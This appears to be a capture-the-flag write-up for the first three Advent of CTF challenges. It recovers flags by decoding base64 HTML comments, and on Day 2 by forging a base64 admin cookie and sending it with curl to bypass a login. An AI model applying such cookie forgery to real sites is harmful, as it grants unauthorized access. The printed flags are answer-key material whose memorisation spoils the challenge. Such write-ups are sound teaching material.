# Day 0
## Description
Do you remember the flag in the teaser website?

## Methodology
We go to [webarchive.org](http://web.archive.org/) and we search for [adventofctf.com](http://web.archive.org/web/20201112020839/https://www.adventofctf.com/). By searching for `<!-- END WAYBACK TOOLBAR INSERT -->` to get the source web of [adventofctf.com](https://adventofctf.com/) by found: `<!-- Ceasar worked on this you know. Tk9WSXtIRVlfMVNfVGgxU19AX0ZsYTk/fQ== -->` the end look like base64.

```bash
$ echo "Tk9WSXtIRVlfMVNfVGgxU19AX0ZsYTk/fQ==" | base64 -d
NOVI{HEY_1S_Th1S_@_Fla9?}
```

# Day 1
## Description
All starts should be easy

Visit https://01.adventofctf.com to start the challenge.

## Methodology
By visiting the provided URL, the have a login form asking for santa's password in plain text. Above the login form there is text saying: "We start off with an easy flag, just to get you familiar with the CTF system. Can you find the flag?". If it is easy, we must of at the HTML source first. By looking quickly in the HTML source we found the following comment: `!-- This is an odd encoded thing right? YWR2ZW50X29mX2N0Zl9pc19oZXJl -->`. This must be base64, let's try:

```bash
echo "YWR2ZW50X29mX2N0Zl9pc19oZXJl" | base64 -d 
advent_of_ctf_is_here
```

And we get the flag by submitting the previous password: `Here is a flag: NOVI{L3T_7H3_M0NTH_0F_FUN_START}`

# Day 2
## Description
For the 2nd challenge you will need to bypass the login mechanism.

Visit https://02.adventofctf.com to start the challenge.

## Methodology
The given URL leads to a login form, by exploring the sources, we saw that the login form request `index.php`, we can't abuse direct page requesting. By submiting random username and password the page says: `I'm sorry Guest, I can not do that.`. We are considered as a guest, intresting. May we look at the cookie? In the cookie there is the following filed: `authenticated: "eyJndWVzdCI6InRydWUiLCJhZG1pbiI6ImZhbHNlIn0="`. By decoding this base64 we have: 
```bash
$ echo "eyJndWVzdCI6InRydWUiLCJhZG1pbiI6ImZhbHNlIn0=" | base64 -d
{"guest":"true","admin":"false"}
```

Great, what we have to is the forge a request where admin is **true** and guest is false:
```bash
$ echo '{"guest":"false","admin":"true"}' | base64
eyJndWVzdCI6ImZhbHNlIiwiYWRtaW4iOiJ0cnVlIn0K
curl 'https://02.adventofctf.com/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://02.adventofctf.com' -H 'Connection: keep-alive' -H 'Referer: https://02.adventofctf.com/index.php' -H 'Cookie: authenticated=eyJndWVzdCI6ImZhbHNlIiwiYWRtaW4iOiJ0cnVlIn0K' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=dfsdf&password=hghf'
<html class="no-js" lang="">
    <head>
[...]
                        NOVI{cookies_are_bad_for_auth}
[...]
	<body>
</html>


